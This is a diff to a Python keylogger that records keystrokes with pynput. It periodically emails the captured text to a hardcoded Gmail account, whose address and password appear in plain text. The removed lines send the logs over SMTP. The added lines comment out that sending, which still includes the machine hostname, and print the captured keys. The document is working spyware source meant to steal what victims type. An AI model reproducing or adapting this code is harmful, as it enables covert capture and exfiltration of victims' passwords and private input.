@@ -2,6 +2,7 @@ from pynput.keyboard import Key, Listener
 import logging
 import datetime
 import smtplib
+import platform
 global maildata
 global sendfreq
 global sent
@@ -13,6 +14,7 @@ sendfreq=5 #in minutes
 sent=False
 mins=-sendfreq
 word=''
+hostname=platform.node()
 
 log_dir = ""
 
@@ -27,22 +29,30 @@ def on_press(key):
     global mins
     global word
 
-    word=word+str(key)
+    #print(abs(mins-datetime.datetime.now().minute))
+    #print(sent)
+    
+
     if len(str(key))!=3:
         maildata.append(word)
+        #print(maildata)
         word=''
+
+    word=word+str(key)[1]
+    #print(word)
     
-    if sent==True and datetime.datetime.now().minute%sendfreq!=0:
-        sent==False
+    if sent==True and abs(mins-datetime.datetime.now().minute)>0:
+        sent=False
     if abs(mins-datetime.datetime.now().minute)>=sendfreq and sent==False:
         mins=datetime.datetime.now().minute
         print('sending email')
-        server = smtplib.SMTP('smtp.gmail.com', 587)
-        server.starttls()
-        server.login("band.mishaps@gmail.com", "Baobab7512")
-        server.sendmail("band.mishaps@gmail.com", "band.mishaps@gmail.com", str(maildata))
-        server.quit()
+        #server = smtplib.SMTP('smtp.gmail.com', 587)
+        #server.starttls()
+        #server.login("band.mishaps@gmail.com", "Baobab7512")
+        #server.sendmail("band.mishaps@gmail.com", "band.mishaps@gmail.com", str(hostname)+'\n'+str(maildata))
+        #server.quit()
         print('email sent')
+        print(maildata)
         sent=True
         maildata=[]
 
